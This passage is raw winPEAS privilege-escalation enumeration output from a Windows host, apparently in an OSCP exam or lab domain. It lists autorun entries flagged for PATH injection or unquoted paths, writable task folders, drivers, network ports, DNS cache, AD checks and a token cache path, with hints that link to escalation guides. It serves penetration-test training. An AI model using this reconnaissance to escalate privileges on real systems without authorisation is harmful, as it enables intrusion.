    File: wow64base.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64con
    Folder: None (PATH Injection)
    File: wow64con.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: xtajit64
    Folder: None (PATH Injection)
    File: xtajit64.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Authenticated Users [Allow: AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}
    Key: StubPath
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\Installer
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\Installer\setup.exe --configure-user-settings --verbose-logging --system-level --msedge (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected) - C:\
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: r.andrews [Allow: AllAccess]
    File: C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows
    FilePerms: r.andrews [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


    Key: From WMIC
    Folder: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive
    FolderPerms: r.andrews [Allow: AllAccess]
    File: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: r.andrews [Allow: AllAccess]
   =================================================================================================


    Key: From WMIC
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
   =================================================================================================


╔══════════╣ Scheduled Applications --Non Microsoft--
╚ Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

╔══════════╣ Device Drivers --Non Microsoft--
╚ Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbd0a.sys
    QLogic 10 GigE - 7.13.171.102 [Marvell Semiconductor Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    VMware vSockets Service - 9.8.19.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    VMware PCI VMCI Bus Device - 9.8.18.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    Boot Camp - 6.1.0.0 [Apple Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\AppleSSD.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    MEGASAS2i RAID Controller Driver for Windows - 6.714.22.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.717.02.00 [Broadcom Inc]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Broadcom Limited]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mpi3drvi.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    VMware PVSCSI StorPort driver (64-bit) - 1.3.15.0 build-18052479 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\pvscsii.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1015 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.1.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    VMware Guest Introspection Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsepflt.sys
    VMware Raw Disk Helper Driver - 1.1.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmrawdsk.sys
    VMware Guest Introspection WFP Network Filter Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vnetWFP.sys
    VMware Pointing PS/2 Device Driver - 12.5.12.0 build-18967789 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware server memory controller - 7.5.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
    VMware PCIe Ethernet Adapter NDIS 6.85 (64-bit) - 1.9.19.0 build-24153797 [Broadcom Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys
    Intel(R) Gigabit Adapter - 12.19.1.32 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\e1i68x64.sys


════════════════════════════════════╣ Network Information ╠════════════════════════════════════

╔══════════╣ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

╔══════════╣ Enumerate Network Mapped Drives (WMI)
   Local Name         :       
   Remote Name        :       \\192.168.49.104\share
   Remote Path        :       \\192.168.49.104\share
   Status             :       OK
   Connection State   :       Connected
   Persistent         :       False
   UserName           :       username
   Description        :       RESOURCE CONNECTED - Microsoft Windows Network

   =================================================================================================


╔══════════╣ Host File

╔══════════╣ Network Ifaces and known hosts
╚ The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:8A:96:F7]: 192.168.104.206 / 255.255.255.0
        Gateways: 192.168.104.254
        Known hosts:
          192.168.104.111       00-50-56-8A-67-09     Dynamic
          192.168.104.254       00-50-56-8A-C5-9B     Dynamic
          192.168.104.255       FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Ethernet1[00:50:56:8A:38:82]: 172.16.104.206 / 255.255.255.0
        DNSs: 172.16.104.200
        Known hosts:
          172.16.104.200        00-50-56-8A-16-6F     Dynamic
          172.16.104.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          224.0.0.252           00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static


╔══════════╣ Current TCP Listening Ports
╚ Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         1004            svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         1060            svchost
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         5560            svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         748             lsass
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         608             wininit
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1448            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         2032            svchost
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         2276            svchost
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         748             lsass
  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         716             services
  TCP        172.16.104.206        139           0.0.0.0               0               Listening         4               System
  TCP        192.168.104.206       139           0.0.0.0               0               Listening         4               System
  TCP        192.168.104.206       3389          192.168.49.104        56942           Established       1060            svchost
  TCP        192.168.104.206       57880         192.168.49.104        445             Established       4               System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        135           [::]                                        0               Listening         1004            svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        3389          [::]                                        0               Listening         1060            svchost
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         748             lsass
  TCP        [::]                                        49665         [::]                                        0               Listening         608             wininit
  TCP        [::]                                        49666         [::]                                        0               Listening         1448            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         2032            svchost
  TCP        [::]                                        49668         [::]                                        0               Listening         2276            svchost
  TCP        [::]                                        49669         [::]                                        0               Listening         748             lsass
  TCP        [::]                                        49670         [::]                                        0               Listening         716             services

╔══════════╣ Current UDP Listening Ports
╚ Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            1324              svchost
  UDP        0.0.0.0               500           *:*                            3100              svchost
  UDP        0.0.0.0               3389          *:*                            1060              svchost
  UDP        0.0.0.0               4500          *:*                            3100              svchost
  UDP        0.0.0.0               5050          *:*                            5560              svchost
  UDP        0.0.0.0               5353          *:*                            1816              svchost
  UDP        0.0.0.0               5355          *:*                            1816              svchost
  UDP        0.0.0.0               54393         *:*                            1816              svchost
  UDP        0.0.0.0               63044         *:*                            1816              svchost
  UDP        127.0.0.1             1900          *:*                            3204              svchost
  UDP        127.0.0.1             51548         *:*                            3204              svchost
  UDP        127.0.0.1             51710         *:*                            4352              C:\Windows\system32\svchost.exe
  UDP        127.0.0.1             53217         *:*                            4848              C:\Users\r.andrews\winPEASx64.exe
  UDP        127.0.0.1             56491         *:*                            748               lsass
  UDP        127.0.0.1             61144         *:*                            1600              svchost
  UDP        127.0.0.1             62196         *:*                            2940              svchost
  UDP        172.16.104.206        137           *:*                            4                 System
  UDP        172.16.104.206        138           *:*                            4                 System
  UDP        172.16.104.206        1900          *:*                            3204              svchost
  UDP        172.16.104.206        51547         *:*                            3204              svchost
  UDP        192.168.104.206       137           *:*                            4                 System
  UDP        192.168.104.206       138           *:*                            4                 System
  UDP        192.168.104.206       1900          *:*                            3204              svchost
  UDP        192.168.104.206       51546         *:*                            3204              svchost

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            1324              svchost
  UDP        [::]                                        500           *:*                            3100              svchost
  UDP        [::]                                        3389          *:*                            1060              svchost
  UDP        [::]                                        4500          *:*                            3100              svchost
  UDP        [::]                                        62055         *:*                            1816              svchost
  UDP        [::]                                        63044         *:*                            1816              svchost
  UDP        [::1]                                       1900          *:*                            3204              svchost
  UDP        [::1]                                       51545         *:*                            3204              svchost

╔══════════╣ Firewall Rules
╚ Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: DOMAIN, PUBLIC
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:
  [X] Exception: Object reference not set to an instance of an object.

╔══════════╣ DNS cached --limit 70--
    Entry                                 Name                                  Data
    _ldap._tcp.pdc._msdcs.oscp.exam       _ldap._tcp.pdc._msdcs.oscp.exam       dc20.oscp.exam 0 100 389
    _ldap._tcp.pdc._msdcs.oscp.exam       dc20.oscp.exam                        172.16.104.200
    dc20.oscp.exam                        DC20.oscp.exam                        172.16.104.200
    dc20.oscp.exam                        DC20.oscp.exam                        172.16.104.200
    ...-name._sites.gc._msdcs.oscp.exam   ...-Name._sites.gc._msdcs.oscp.exam   dc20.oscp.exam 0 100 3268
    ...-name._sites.gc._msdcs.oscp.exam   dc20.oscp.exam                        172.16.104.200
    ...._sites.forestdnszones.oscp.exam   ...._sites.ForestDnsZones.oscp.exam   dc20.oscp.exam 0 100 389
    ...._sites.forestdnszones.oscp.exam   dc20.oscp.exam                        172.16.104.200
    displaycatalog.mp.microsoft.com                                             
    ...._sites.domaindnszones.oscp.exam   ...._sites.DomainDnsZones.oscp.exam   dc20.oscp.exam 0 100 389
    ...._sites.domaindnszones.oscp.exam   dc20.oscp.exam                        172.16.104.200

╔══════════╣ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        CertificateRevocation                     1
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           10240
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKCU        WarnonZoneCrossing                        0
  HKCU        EnableNegotiate                           1
  HKCU        ProxyEnable                               0
  HKCU        MigrateProxy                              1
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings

╔══════════╣ Internet Connectivity
╚ Checking if internet access is possible via different methods 
    HTTP (80) Access: Not Accessible
  [X] Exception:       Error: A task was canceled.
    HTTPS (443) Access: Not Accessible
  [X] Exception:       Error: TCP connect timed out
    HTTPS (443) Access by Domain Name: Not Accessible
  [X] Exception:       Error: A task was canceled.
    DNS (53) Access: Not Accessible
  [X] Exception:       Error: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
    ICMP (ping) Access: Not Accessible
  [X] Exception:       Error: Ping failed: TimedOut

╔══════════╣ Hostname Resolution
╚ Checking if the hostname can be resolved externally 
  [X] Exception:     Error during hostname check: An error occurred while sending the request.


════════════════════════════════════╣ Active Directory Quick Checks ╠════════════════════════════════════

╔══════════╣ gMSA readable managed passwords
╚ Look for Group Managed Service Accounts you can read (msDS-ManagedPassword) https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gmsa.html
  [-] No gMSA with readable managed password found (checked 0).

╔══════════╣ AD CS misconfigurations for ESC
╚  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
╚ Check for ADCS misconfigurations in the local DC registry
  [-] Host is not a domain controller. Skipping ADCS Registry check
╚ 
If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4
  [-] No templates with dangerous rights found (checked 0).


════════════════════════════════════╣ Cloud Information ╠════════════════════════════════════
Learn and practice cloud hacking in training.hacktricks.xyz
AWS EC2?                                No   
Azure VM?                               No   
Azure Tokens?                           Yes  
Google Cloud Platform?                  No   
Google Workspace Joined?                No   
Google Cloud Directory Sync?            No   
Google Password Sync?                   No   

╔══════════╣ Azure Tokens Enumeration
  [X] Exception: The directory 'C:\Users\r.andrews\AppData\Local\Microsoft\IdentityCache' does not exist.
  [X] Exception: An error occurred while scanning the identityCache directory: Could not find a part of the path 'C:\Users\r.andrews\AppData\Local\Microsoft\IdentityCache'.
Local Info
C:\Users\r.andrews\AppData\Local\Microsoft\TokenBroker\Cache\2018c83c16e29d57e69047a488b1267e21c9c9bf.tbres

```